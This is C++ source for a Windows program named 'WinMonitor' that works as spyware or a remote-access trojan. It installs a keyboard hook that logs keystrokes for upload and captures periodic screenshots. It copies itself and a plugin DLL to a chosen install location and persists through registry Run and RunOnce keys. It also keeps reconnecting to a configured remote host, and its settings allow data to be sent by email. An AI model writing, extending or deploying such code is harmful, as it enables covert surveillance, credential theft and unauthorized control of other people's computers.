
bool ClearRevConn(CWinMonitorServicer  **WServer,CTcpNwMonitorConnection **Con)
{
	try
	{
		gbl_ReverseClient=0;
		if(*WServer)
		{
			(*WServer)->StopService();
			delete *WServer;
			*WServer=0;
		}
		if(*Con)
		{
			(*Con)->Disconnect();
			delete *Con;
			*Con=0;
		}
	}
	catch(...) { return false; }
	return true;
}

DWORD WINAPI ReverseConnectionThread(LPVOID Fname)
{
	CTcpNwMonitorConnection *ServerCon=0;
	CWinMonitorServicer *WinServer=0;
	//MSG msg;

	do 
	{
		try 
		{ 
			if(WinServer && gbl_lnkdlst_TcpClients.GetItemByAddress((UINT64)WinServer)) continue; 
			WinServer=0; ServerCon=0;
		} 
		catch(...) { WinServer=0; ServerCon=0; }
		
		if(ClearRevConn(&WinServer,&ServerCon),!(WinServer=new CWinMonitorServicer()) || !(ServerCon=new CTcpNwMonitorConnection())) continue;
	
		if(ServerCon->ConnectTo(ServerCon->GetHostIP(gbl_struct_WinMonitorServerConfig.SpReverseConnection->tchrIP),gbl_struct_WinMonitorServerConfig.SpReverseConnection->lngPort))     
		{
			if(!WinServer->ServiceClient(*ServerCon,true,true,false)) continue;
			gbl_lnkdlst_TcpClients.InsertAtBack((void*)WinServer); 
			gbl_ReverseClient=(void*)WinServer;
			gbl_hReverseConnectionThread=0;
			return 0;
		}
	}
	while(Sleep(gbl_struct_WinMonitorServerConfig.SpReverseConnection->fltAttemptInterval*1000),gbl_blnContinueReverseConnection);

	ClearRevConn(&WinServer,&ServerCon);
	gbl_hReverseConnectionThread=0;

	return true;
}

bool GetModule(DWORD dwPID,LPMODULEENTRY32 lpMe32)
{
	HANDLE        hModuleSnap = NULL; 
	MODULEENTRY32 me32        = {0}; 

	hModuleSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID); 
	if (hModuleSnap == INVALID_HANDLE_VALUE) return false;
	me32.dwSize = sizeof(MODULEENTRY32); 
	if (Module32First(hModuleSnap, &me32)) 
    { 
		CopyMemory(lpMe32, &me32, sizeof(MODULEENTRY32)); 
	}
	return false;
}

bool  GetProcess(DWORD pid,PROCESSENTRY32 &pe32)
{
	HANDLE         hProcessSnap = NULL; 
    bool           bRet=false; 
    

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); 
    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;
	pe32.dwSize = sizeof(PROCESSENTRY32); 

	if (Process32First(hProcessSnap, &pe32)) 
    { 
        do 
        { 
			if(pid==pe32.th32ProcessID)
			{
				bRet =true;
				break;
			}
         } 
        while (Process32Next(hProcessSnap, &pe32)); 
    }   
    CloseHandle (hProcessSnap); 
    if(!bRet) return false; else return true;
}



bool LoadWinMonitorServerConfigurationFromINI(SWinMonitorServerConfiguration &SConfig)
{
	CTString tchrINIfilename;
	CTString tchrTmp(1000),tchrCurDir;
	PROCESSENTRY32 pe32;

	memset((void*)&SConfig,0,sizeof(SWinMonitorServerConfiguration));

	if(!GetProcess(GetCurrentProcessId(),(PROCESSENTRY32&)pe32)) return false;
	SConfig.SGeneral.tchrFileName = pe32.szExeFile;

	tchrCurDir = CTString::GetDirectory(&GetCurrentDirectory); 

	gbl_struct_WinMonitorStoredFiles.tchrExeFullPath = tchrCurDir + (TCHAR*)"\\" + SConfig.SGeneral.tchrFileName;
	tchrINIfilename = tchrCurDir + (TCHAR*)"\\" + (TCHAR*)DEF_CONFIG_INI;

	//--------General settings

	if(GetPrivateProfileString("WIN_MONITOR_SERVER","DATE",(LPTSTR)"UNKNOWN",(LPTSTR)tchrTmp,1000,tchrINIfilename)) 
		SConfig.SGeneral.tchrCreationDate = tchrTmp;

	if(GetPrivateProfileString("WIN_MONITOR_SERVER","TIME",(LPTSTR)"UNKNOWN",(LPTSTR)tchrTmp,1000,tchrINIfilename)) 
		SConfig.SGeneral.tchrCreationTime = tchrTmp;
	  
	if(GetPrivateProfileString("WIN_MONITOR_SERVER","INTERNAL-NAME",(LPTSTR)"UNKNOWN",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SGeneral.tchrInternalName = tchrTmp; 

	if(!GetPrivateProfileString("WIN_MONITOR_SERVER","INSTALL-LOCATION",(LPTSTR)"",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		return false;  
	
	SConfig.SGeneral.tchrInstallLocation = tchrTmp; 

	//--------Registry settings

	if(!GetPrivateProfileString("REGISTRY-SETTINGS","REGISTRY-KEY",(LPTSTR)"",(LPTSTR)tchrTmp,1000,tchrINIfilename))
	{
		return false;  
	}

	SConfig.SRegistry.tchrRegKey = tchrTmp; 

	if(GetPrivateProfileString("REGISTRY-SETTINGS","LOCAL-USER_RUN-ALWAYS",(LPTSTR)"F",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SRegistry.blnLocalUserRunAlways=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	if(GetPrivateProfileString("REGISTRY-SETTINGS","LOCAL-MACHINE_RUN-ALWAYS",(LPTSTR)"F",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SRegistry.blnLocalMachineRunAlways=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	if(GetPrivateProfileString("REGISTRY-SETTINGS","LOCAL-MACHINE_RUN-ONCE",(LPTSTR)"F",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SRegistry.blnLocalMachineRunOnce=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	//--------Key Monitor settings

	if(GetPrivateProfileString("KEY-MONITOR","INCLUDE-DATE",(LPTSTR)"T",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SKeyLogger.blnIncludeDate=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	if(GetPrivateProfileString("KEY-MONITOR","INCLUDE-TIME",(LPTSTR)"T",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SKeyLogger.blnIncludeTime=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	if(GetPrivateProfileString("KEY-MONITOR","INCLUDE-USER",(LPTSTR)"T",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SKeyLogger.blnIncludeUser=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	if(GetPrivateProfileString("KEY-MONITOR","UPLOAD-SIZE",(LPTSTR)"100",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		_stscanf(tchrTmp,_T("%d"),&SConfig.SKeyLogger.lngUploadSize); 
	else 
		SConfig.SKeyLogger.lngUploadSize = 100;

	if(GetPrivateProfileString("KEY-MONITOR","ROOT-DIRECTORY",(LPTSTR)"SYSTEM",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SKeyLogger.tchrRootDir = tchrTmp;   

	if(GetPrivateProfileString("KEY-MONITOR","LOG-FILE-NAME",(LPTSTR)"WIN_KEYS.FILE",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SKeyLogger.tchrFilePath = tchrTmp;  

	//--------Screen Monitor settings

	if(GetPrivateProfileString("SCREEN-MONITOR","FILE-LIMIT",(LPTSTR)"1000",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		_stscanf(tchrTmp,_T("%d"),&SConfig.SScreenMonitor.lngFileLimit);
	else
		SConfig.SScreenMonitor.lngFileLimit = 1000;

	if(GetPrivateProfileString("SCREEN-MONITOR","ROOT-DIRECTORY",(LPTSTR)"SYSTEM",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SScreenMonitor.tchrRootDir = tchrTmp;  

	if(GetPrivateProfileString("SCREEN-MONITOR","PICTURE-DIRECTORY",(LPTSTR)"PIC\\SHOTS",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.SScreenMonitor.tchrSavePath = tchrTmp;  

	GetPrivateProfileString("SCREEN-MONITOR","TIME-INTERVAL",(LPTSTR)"SECOND",(LPTSTR)tchrTmp,1000,tchrINIfilename);

	long intIntervalBase=1;

	switch(tchrTmp[(ULONG)0])
	{
		case _T('S'):case _T('s'): intIntervalBase=1;break;
		case _T('M'):case _T('m'): intIntervalBase=60;break;
		case _T('H'):case _T('h'): intIntervalBase=60*60;break;
	}

	if(GetPrivateProfileString("SCREEN-MONITOR","ELAPSING-TIME",(LPTSTR)"5000",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		_stscanf(tchrTmp,_T("%d"),&SConfig.SScreenMonitor.lngElapseTimeInSeconds);
	else
		SConfig.SScreenMonitor.lngElapseTimeInSeconds = 5000;

	SConfig.SScreenMonitor.lngElapseTimeInSeconds*=intIntervalBase;

	//--------Network Monitor settings

	if(GetPrivateProfileString("NETWORK-MONITOR","REVERSE-CONNECT",(LPTSTR)"FALSE",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.blnReverseConnection=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	if(GetPrivateProfileString("NETWORK-MONITOR","EMAIL",(LPTSTR)"FALSE",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		SConfig.blnEmail=(tchrTmp[(ULONG)0]==_T('T') || tchrTmp[(ULONG)0]==_T('t'))?true:false;

	if(SConfig.blnReverseConnection)
	{
	   SConfig.SpReverseConnection=new SWinMonitorServerReverseConnection;
	   
	   memset((void*)(SConfig.SpReverseConnection),0,sizeof(SWinMonitorServerReverseConnection));

	   if(GetPrivateProfileString("REVERSE-CONNECTION","IP",(LPTSTR)"127.0.0.1",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		   SConfig.SpReverseConnection->tchrIP = tchrTmp;  

	   if(GetPrivateProfileString("REVERSE-CONNECTION","PORT",(LPTSTR)"5000",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		   _stscanf(tchrTmp,_T("%d"),&(SConfig.SpReverseConnection->lngPort));
	   else
			SConfig.SpReverseConnection->lngPort = 5000;

	   if(GetPrivateProfileString("REVERSE-CONNECTION","ATTEMPT-INTERVAL",(LPTSTR)"500",(LPTSTR)tchrTmp,1000,tchrINIfilename))
		   _stscanf(tchrTmp,_T("%f"),&(SConfig.SpReverseConnection->fltAttemptInterval));
	   else 
		   SConfig.SpReverseConnection->fltAttemptInterval = 500;
	} 
	else SConfig.SpReverseConnection=0;

	if(SConfig.blnEmail)
	{
		SConfig.SpEmail=new SWinMonitorServerEmail;

		memset((void*)(SConfig.SpEmail),0,sizeof(SWinMonitorServerEmail));

		if(GetPrivateProfileString("NETWORK-MONITOR","EMAIL_ID",(LPTSTR)"",(LPTSTR)tchrTmp,1000,tchrINIfilename))
			SConfig.SpEmail->tchrEmail=tchrTmp;  

		if(GetPrivateProfileString("NETWORK-MONITOR","EMAIL_SERVER",(LPTSTR)"",(LPTSTR)tchrTmp,1000,tchrINIfilename))
			SConfig.SpEmail->tchrEmailServer=tchrTmp;  
	}
	else SConfig.SpEmail=0; 

	if(GetPrivateProfileString("NETWORK-MONITOR","HOST",(LPTSTR)"127.0.0.1",tchrTmp,1000,tchrINIfilename))
		SConfig.SNetworkConnection.tchrHostName = tchrTmp;  

	if(GetPrivateProfileString("NETWORK-MONITOR","PASSWORD",(LPTSTR)"",tchrTmp,1000,tchrINIfilename))
		SConfig.SNetworkConnection.tchrPassword = tchrTmp;  

	if(GetPrivateProfileString("NETWORK-MONITOR","PORT",(LPTSTR)"3000",tchrTmp,1000,tchrINIfilename))
		_stscanf(tchrTmp,_T("%d"),&SConfig.SNetworkConnection.lngListenPort);
	else
		SConfig.SNetworkConnection.lngListenPort = 3000;

	return true;
}


bool IsConfigFileExists(void)
{
	FILE *Fp=fopen(DEF_CONFIG_INI,"rb");
	if(!Fp) return false;
	fclose(Fp);
	return true;
}

bool ExtractConfigFileFromEXE(void)
{
	CexeExtraEditor exeEditor;
	return exeEditor.ExtractFileFromHandle(GetModuleHandle(0),_T("WinMonitorConfig"),_T("WinMonitorConfigINI"),_T(DEF_CONFIG_INI));
}

bool MapExeToProperPlace(void)
{
	CTString tchrINIfilename,tchrRealINI,tchrDllName,tchrTmp(1000);
	PROCESSENTRY32 pe32;

	try
	{
		if(!IsConfigFileExists()) return false;

		tchrINIfilename = CTString::GetDirectory(&GetCurrentDirectory) + (TCHAR*) "\\" + (TCHAR*)DEF_CONFIG_INI;

		CTString tchrRoot(250),tchrLowerRootDir(250);
		CTString tchrLowerRoot;
		
		if(!GetPrivateProfileString("WIN_MONITOR_SERVER","INSTALL-LOCATION",(LPTSTR)"SYSTEM",(LPTSTR)(TCHAR*)tchrRoot,250,tchrINIfilename))
			return false;
		
		if(!GetPrivateProfileString("WIN_MONITOR_SERVER","FILE-NAME",(LPTSTR)"SYSTEM",(LPTSTR)(TCHAR*)tchrLowerRootDir,250,tchrINIfilename))
			return false;
		
		if(tchrLowerRoot=CTString::CreateFolderLocation(tchrRoot,tchrLowerRootDir),tchrLowerRoot == (UINT64)0) return false;
	
		DWORD pid=GetCurrentProcessId();
		UINT uintLen=0;
		CTString tchrTrimLowerRoot,tchrTrimCurDir;
		CTString tchrCurDir=CTString::GetDirectory(&GetCurrentDirectory);
		
		if(!GetProcess(pid,pe32)) return false;
		else
			if(tchrCurDir += CTString(_T("\\")) + pe32.szExeFile,tchrLowerRoot.Trim().ToLower() == tchrCurDir.Trim().ToLower())   
			{		 
				return true;
			}		
		
		TCHAR prevChr=0;
		prevChr=tchrLowerRoot[(ULONG)(uintLen = (tchrLowerRoot.LastIndexOf(_T('\\')) + 1))];
		tchrLowerRoot[(ULONG)uintLen]=_T('\0');
		
		if(!tchrLowerRoot.CreatePath())
		{
			return false;
		}
		tchrLowerRoot[(ULONG)uintLen]=prevChr;
		if(!CopyFile(tchrCurDir,tchrLowerRoot,false))
		{
			return false;
		}
		tchrRealINI = tchrLowerRoot.AttachAnotherFileName((TCHAR*)DEF_CONFIG_INI); 
		if(!CopyFile(tchrINIfilename,tchrRealINI,false))
		{
			return false;
		}
		tchrDllName = tchrINIfilename.AttachAnotherFileName((TCHAR*)"WinMonitorServerPlugin.dll"); 

		//---Sorry here Dll is mentioned as INI
		tchrRealINI = tchrLowerRoot.AttachAnotherFileName((TCHAR*)"WinMonitorServerPlugin.dll"); 
		if(!CopyFile(tchrDllName,tchrRealINI,false))
		{
			return false;
		}
		CTString tchrpid(10); 
		CTString Param; 

		tchrLowerRoot[(ULONG)uintLen]=_T('\0');
		SetCurrentDirectory(tchrLowerRoot); 
		tchrLowerRoot[(ULONG)uintLen]=prevChr;

		_stprintf(tchrpid,"%u",pe32.th32ProcessID);
		Param = tchrCurDir + "|" + tchrpid;

		if(((int)ShellExecute(0,"open",tchrLowerRoot,(LPCSTR)(TCHAR*)Param,0,0))>32)
		{
			while(true) Sleep(10000);
			return true;
		}
		else
		{
			return false;
		}
	}
	catch(...)
	{
		return false;
	}
}

bool CreateKeyLogFile(void)
{
	gbl_struct_WinMonitorStoredFiles.tchrKeyLogFile.Clear();

	CTString tchrKeyLogFile=
	CTString::CreateFolderLocation
	(
		gbl_struct_WinMonitorServerConfig.SKeyLogger.tchrRootDir,
		gbl_struct_WinMonitorServerConfig.SKeyLogger.tchrFilePath
	);  

	CTString tchrKeyPath,tchrKeyFile;
	
	tchrKeyPath = tchrKeyLogFile.GetDirectoryPart();
	tchrKeyFile  = tchrKeyLogFile.GetFileNamePart(); 	
	if(!tchrKeyPath.CreatePath()) return false;

	FILE *f=fopen(tchrKeyLogFile,"a+");
	
	gbl_struct_WinMonitorStoredFiles.tchrKeyLogFile=tchrKeyLogFile;

	if(!f) return false;
	fclose(f);
	return true;
}


bool CreateScreenShotDir(void)
{
	gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir=0;

	gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir= 
	CTString::CreateFolderLocation
	(  
		gbl_struct_WinMonitorServerConfig.SScreenMonitor.tchrRootDir,
		gbl_struct_WinMonitorServerConfig.SScreenMonitor.tchrSavePath
    );  
	if(!gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir.CreatePath()) return false; 
	return true;
}


bool UpdateRegistry(void)
{
	struct HKEY__ *hKey;
	unsigned long  hKeyResult;

	if(gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunAlways)
	{
		if(RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		              0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&hKeyResult)!=ERROR_SUCCESS) return false;

 	}
	else if(gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunOnce) 
	{
		if(RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
		   0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&hKeyResult)!=ERROR_SUCCESS) return false;
	}
    
	if( gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunAlways ||
        gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalMachineRunOnce    )
			if(RegSetValueEx(hKey,gbl_struct_WinMonitorServerConfig.SRegistry.tchrRegKey, 
			  (DWORD)0,(DWORD)REG_SZ,(BYTE*)(const TCHAR*)gbl_struct_WinMonitorStoredFiles.tchrExeFullPath,
			   sizeof(TCHAR) * _tcslen(gbl_struct_WinMonitorStoredFiles.tchrExeFullPath))!=ERROR_SUCCESS) return false;
			else RegCloseKey(hKey);
	
	if(gbl_struct_WinMonitorServerConfig.SRegistry.blnLocalUserRunAlways)
	{
		if(RegCreateKeyEx(HKEY_CURRENT_USER,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
		              0,0,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,0,&hKey,&hKeyResult)!=ERROR_SUCCESS) return false;

		if(RegSetValueEx(hKey,gbl_struct_WinMonitorServerConfig.SRegistry.tchrRegKey, 
				(DWORD)0,(DWORD)REG_SZ,(BYTE*)(const TCHAR*)gbl_struct_WinMonitorStoredFiles.tchrExeFullPath,
				 sizeof(TCHAR) * _tcslen(gbl_struct_WinMonitorStoredFiles.tchrExeFullPath))!=ERROR_SUCCESS) return false;

		RegCloseKey(hKey);
	}
	return true;
}

bool SetKeyBoardHook(void)
{
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_FILE,gbl_struct_WinMonitorStoredFiles.tchrKeyLogFile,DEF_INI_FILE_NAME)) return false;  
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_DATE,gbl_struct_WinMonitorServerConfig.SKeyLogger.blnIncludeDate?"T":"F",DEF_INI_FILE_NAME)) return false;  
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_TIME,gbl_struct_WinMonitorServerConfig.SKeyLogger.blnIncludeTime?"T":"F",DEF_INI_FILE_NAME)) return false;  
	if(!WritePrivateProfileString(DEF_INI_APP_NAME,DEF_INI_KEY_KEYBOARD_HOOK_INC_USER,gbl_struct_WinMonitorServerConfig.SKeyLogger.blnIncludeUser?"T":"F",DEF_INI_FILE_NAME)) return false;  
	
	if(!InstallKBrdHook) 
		return false;
	else 
		return InstallKBrdHook();
}

bool UnInstallKeyBoardHook(void)
{
	if(!UnInstallKBrdHook) 
		return false;
	else 
		return UnInstallKBrdHook();
}


DWORD WINAPI ScreenSnatcherThread(LPVOID Fname)
{
	int intStart=0,intEnd=gbl_struct_WinMonitorServerConfig.SScreenMonitor.lngFileLimit;   
	long lngElapseTime=gbl_struct_WinMonitorServerConfig.SScreenMonitor.lngElapseTimeInSeconds; 

	CDesktopPlugin ScreenMonitor;
	if(!ScreenMonitor.IsValid()) return -1; 
	
	ScreenMonitor.SetCompression(SCREEN_MONITOR_COMPRESS_LZSS);

	CTString  tchrFileCur(intEnd);

	while(gbl_blnContinueScreenSnatching)
	{
		if(intStart>=intEnd) intStart=0;
		_stprintf(tchrFileCur,_T("%ld"),intStart);		
		CTString tchrCur;

		tchrCur = gbl_struct_WinMonitorStoredFiles.tchrScreenShotDir +
			     _T("\\") +
				  DEF_PIC_FILE_BASE +
				  tchrFileCur +
				 _T(".CBMP");			

		ScreenMonitor.CaptureDesktop();
		ScreenMonitor.SaveImageToFile(tchrCur,true);
		intStart++;
		Sleep(lngElapseTime*1000);
	}
	return 0;
}

bool UnInstallScreenSnatcher(void)
{
	if(gbl_hScreenSnatcherThread)
	{
		gbl_blnContinueScreenSnatching=false;
		DWORD ExitCode;
		if(GetExitCodeThread(gbl_hScreenSnatcherThread,&ExitCode))
			if(ExitCode==STILL_ACTIVE)
				if(WaitForSingleObject(gbl_hScreenSnatcherThread,2000)!=WAIT_OBJECT_0)
					TerminateThread(gbl_hScreenSnatcherThread,0);
				
	}
	gbl_hScreenSnatcherThread=0;
	return true;		
}

bool InstallScreenSnatcher(void)
{
	if(!gbl_hScreenSnatcherThread)
	{
		 gbl_blnContinueScreenSnatching=true;
		 if((gbl_hScreenSnatcherThread=CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)&ScreenSnatcherThread,NULL,NULL,NULL))==0)
			return false;
	}
	return true;
}

bool UnloadConfigSettings(SWinMonitorServerConfiguration &oConfigSetting,SWinMonitorStoredFiles &oConfigFiles)
{
	try
	{
		if(oConfigSetting.SpEmail)
		{
			delete oConfigSetting.SpEmail;
		}
		if(oConfigSetting.SpReverseConnection)
		{
			delete oConfigSetting.SpReverseConnection;
		}
	}
	catch(...) { return false; }
	return true;
}

//---KeyBrd Hook : WH_KEYBOARD
//  if (cde<0)if(cde!=HC_ACTION)  return CallNextHookEx((HHOOK)MyHook,cde,w,l); 	
//  if(GetKeyStroke(w,&decoded))